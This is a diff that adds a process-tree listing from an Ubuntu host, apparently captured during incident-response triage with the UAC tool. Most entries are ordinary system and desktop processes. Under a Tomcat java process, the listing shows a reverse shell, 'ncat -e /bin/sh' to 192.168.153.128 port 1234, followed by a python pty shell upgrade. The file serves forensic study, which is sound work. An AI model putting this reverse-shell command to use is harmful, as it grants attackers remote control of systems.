@@ -1,0 +1,225 @@
+systemd splash
+  |-ModemManager
+  |   `-3*[{ModemManager}]
+  |-NetworkManager --no-daemon
+  |   `-3*[{NetworkManager}]
+  |-accounts-daemon
+  |   `-3*[{accounts-daemon}]
+  |-avahi-daemon
+  |   `-avahi-daemon
+  |-colord
+  |   `-3*[{colord}]
+  |-cron -f -P
+  |-cups-browsed
+  |   `-3*[{cups-browsed}]
+  |-cupsd -l
+  |-dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  |-gdm3
+  |   |-gdm-session-wor
+  |   |   |-gdm-wayland-ses env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
+  |   |   |   |-gnome-session-b --session=ubuntu
+  |   |   |   |   `-3*[{gnome-session-b}]
+  |   |   |   `-3*[{gdm-wayland-ses}]
+  |   |   `-3*[{gdm-session-wor}]
+  |   `-3*[{gdm3}]
+  |-gnome-remote-de --system
+  |   `-3*[{gnome-remote-de}]
+  |-kerneloops --test
+  |-kerneloops
+  |-polkitd --no-debug
+  |   `-3*[{polkitd}]
+  |-power-profiles-
+  |   `-3*[{power-profiles-}]
+  |-rsyslogd -n -iNONE
+  |   `-3*[{rsyslogd}]
+  |-rtkit-daemon
+  |   `-2*[{rtkit-daemon}]
+  |-snapd
+  |   `-10*[{snapd}]
+  |-switcheroo-cont
+  |   `-3*[{switcheroo-cont}]
+  |-systemd --user
+  |   |-(sd-pam)
+  |   |-at-spi2-registr --use-gnome-session
+  |   |   `-3*[{at-spi2-registr}]
+  |   |-dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  |   |-dconf-service
+  |   |   `-3*[{dconf-service}]
+  |   |-evolution-addre
+  |   |   `-6*[{evolution-addre}]
+  |   |-evolution-calen
+  |   |   `-9*[{evolution-calen}]
+  |   |-evolution-sourc
+  |   |   `-4*[{evolution-sourc}]
+  |   |-gcr-ssh-agent --base-dir /run/user/1000/gcr
+  |   |   `-2*[{gcr-ssh-agent}]
+  |   |-gjs -m /usr/share/gnome-shell/org.gnome.Shell.Notifications
+  |   |   `-11*[{gjs}]
+  |   |-gjs -m /usr/share/gnome-shell/org.gnome.ScreenSaver
+  |   |   `-11*[{gjs}]
+  |   |-gnome-keyring-d --foreground --components=pkcs11,secrets --control-directory=/run/user/1000/keyring
+  |   |   `-4*[{gnome-keyring-d}]
+  |   |-gnome-session-b --systemd-service --session=ubuntu
+  |   |   |-at-spi-bus-laun --launch-immediately
+  |   |   |   |-dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 11...
+  |   |   |   `-4*[{at-spi-bus-laun}]
+  |   |   |-evolution-alarm
+  |   |   |   `-7*[{evolution-alarm}]
+  |   |   |-gsd-disk-utilit
+  |   |   |   `-3*[{gsd-disk-utilit}]
+  |   |   |-update-notifier
+  |   |   |   `-5*[{update-notifier}]
+  |   |   `-4*[{gnome-session-b}]
+  |   |-gnome-session-c --monitor
+  |   |   `-{gnome-session-c}
+  |   |-gnome-shell
+  |   |   |-firefox
+  |   |   |   |-crashhelper 5309 9 /tmp/ 10 12
+  |   |   |   |   `-{crashhelper}
+  |   |   |   |-forkserver -contentproc -ipcHandle 0 -signalPipe 1 -initialChannelId{4f681eb4-7129-4c96-98a4-07f674
+  |   |   |   |   |-Isolated Web Co
+  |   |   |   |   |   `-21*[{Isolated Web Co}]
+  |   |   |   |   |-Isolated Web Co
+  |   |   |   |   |   `-20*[{Isolated Web Co}]
+  |   |   |   |   |-Privileged Cont
+  |   |   |   |   |   `-21*[{Privileged Cont}]
+  |   |   |   |   |-RDD Process
+  |   |   |   |   |   `-4*[{RDD Process}]
+  |   |   |   |   |-Socket Process
+  |   |   |   |   |   `-6*[{Socket Process}]
+  |   |   |   |   |-Utility Process
+  |   |   |   |   |   `-4*[{Utility Process}]
+  |   |   |   |   |-Web Content
+  |   |   |   |   |   `-15*[{Web Content}]
+  |   |   |   |   |-Web Content
+  |   |   |   |   |   `-15*[{Web Content}]
+  |   |   |   |   |-Web Content
+  |   |   |   |   |   `-15*[{Web Content}]
+  |   |   |   |   `-WebExtensions
+  |   |   |   |       `-20*[{WebExtensions}]
+  |   |   |   `-90*[{firefox}]
+  |   |   |-gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js -E -P...
+  |   |   |   `-13*[{gjs}]
+  |   |   `-17*[{gnome-shell}]
+  |   |-gnome-shell-cal
+  |   |   `-6*[{gnome-shell-cal}]
+  |   |-gnome-terminal-
+  |   |   |-bash
+  |   |   |   `-sudo ./uac -p ir_triage /tmp
+  |   |   |       `-sudo ./uac -p ir_triage /tmp
+  |   |   |           `-uac ./uac -p ir_triage /tmp
+  |   |   |               `-uac ./uac -p ir_triage /tmp
+  |   |   |                   `-pstree -a
+  |   |   `-5*[{gnome-terminal-}]
+  |   |-goa-daemon
+  |   |   `-4*[{goa-daemon}]
+  |   |-goa-identity-se
+  |   |   `-3*[{goa-identity-se}]
+  |   |-gsd-a11y-settin
+  |   |   `-4*[{gsd-a11y-settin}]
+  |   |-gsd-color
+  |   |   `-4*[{gsd-color}]
+  |   |-gsd-datetime
+  |   |   `-4*[{gsd-datetime}]
+  |   |-gsd-housekeepin
+  |   |   `-4*[{gsd-housekeepin}]
+  |   |-gsd-keyboard
+  |   |   `-4*[{gsd-keyboard}]
+  |   |-gsd-media-keys
+  |   |   `-5*[{gsd-media-keys}]
+  |   |-gsd-power
+  |   |   `-4*[{gsd-power}]
+  |   |-gsd-print-notif
+  |   |   `-3*[{gsd-print-notif}]
+  |   |-gsd-printer
+  |   |   `-3*[{gsd-printer}]
+  |   |-gsd-rfkill
+  |   |   `-3*[{gsd-rfkill}]
+  |   |-gsd-screensaver
+  |   |   `-3*[{gsd-screensaver}]
+  |   |-gsd-sharing
+  |   |   `-4*[{gsd-sharing}]
+  |   |-gsd-smartcard
+  |   |   `-4*[{gsd-smartcard}]
+  |   |-gsd-sound
+  |   |   `-4*[{gsd-sound}]
+  |   |-gsd-wacom
+  |   |   `-4*[{gsd-wacom}]
+  |   |-gvfs-afc-volume
+  |   |   `-4*[{gvfs-afc-volume}]
+  |   |-gvfs-goa-volume
+  |   |   `-3*[{gvfs-goa-volume}]
+  |   |-gvfs-gphoto2-vo
+  |   |   `-3*[{gvfs-gphoto2-vo}]
+  |   |-gvfs-mtp-volume
+  |   |   `-3*[{gvfs-mtp-volume}]
+  |   |-gvfs-udisks2-vo
+  |   |   `-4*[{gvfs-udisks2-vo}]
+  |   |-gvfsd
+  |   |   |-gvfsd-recent --spawner :1.20 /org/gtk/gvfs/exec_spaw/1
+  |   |   |   `-3*[{gvfsd-recent}]
+  |   |   |-gvfsd-trash --spawner :1.20 /org/gtk/gvfs/exec_spaw/0
+  |   |   |   `-4*[{gvfsd-trash}]
+  |   |   `-3*[{gvfsd}]
+  |   |-gvfsd-fuse /run/user/1000/gvfs -f
+  |   |   `-7*[{gvfsd-fuse}]
+  |   |-gvfsd-metadata
+  |   |   `-3*[{gvfsd-metadata}]
+  |   |-ibus-daemon --panel disable
+  |   |   |-ibus-engine-sim
+  |   |   |   `-3*[{ibus-engine-sim}]
+  |   |   |-ibus-extension-
+  |   |   |   `-4*[{ibus-extension-}]
+  |   |   |-ibus-memconf
+  |   |   |   `-3*[{ibus-memconf}]
+  |   |   `-3*[{ibus-daemon}]
+  |   |-ibus-portal
+  |   |   `-3*[{ibus-portal}]
+  |   |-java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.90/conf/logging.properties-Djava.util.logging.manager=org.apac
+  |   |   |-ncat -e /bin/sh 192.168.153.128 1234
+  |   |   |   `-sh
+  |   |   |       `-python3 -c import pty; pty.spawn("/bin/bash")
+  |   |   |           `-bash
+  |   |   `-37*[{java}]
+  |   |-nautilus --gapplication-service
+  |   |   `-6*[{nautilus}]
+  |   |-pipewire
+  |   |   `-2*[{pipewire}]
+  |   |-pipewire -c filter-chain.conf
+  |   |   `-2*[{pipewire}]
+  |   |-pipewire-pulse
+  |   |   `-2*[{pipewire-pulse}]
+  |   |-snap userd
+  |   |   `-9*[{snap}]
+  |   |-snapd-desktop-i
+  |   |   `-snapd-desktop-i
+  |   |       `-4*[{snapd-desktop-i}]
+  |   |-tracker-miner-f
+  |   |   `-7*[{tracker-miner-f}]
+  |   |-wireplumber
+  |   |   `-5*[{wireplumber}]
+  |   |-xdg-desktop-por
+  |   |   `-6*[{xdg-desktop-por}]
+  |   |-xdg-desktop-por
+  |   |   `-5*[{xdg-desktop-por}]
+  |   |-xdg-desktop-por
+  |   |   `-4*[{xdg-desktop-por}]
+  |   |-xdg-document-po
+  |   |   |-fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1000/doc
+  |   |   `-6*[{xdg-document-po}]
+  |   `-xdg-permission-
+  |       `-3*[{xdg-permission-}]
+  |-systemd-journal
+  |-systemd-logind
+  |-systemd-oomd
+  |-systemd-resolve
+  |-systemd-timesyn
+  |   `-{systemd-timesyn}
+  |-systemd-udevd
+  |-udisksd
+  |   `-5*[{udisksd}]
+  |-unattended-upgr /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+  |   `-{unattended-upgr}
+  |-upowerd
+  |   `-3*[{upowerd}]
+  `-wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev
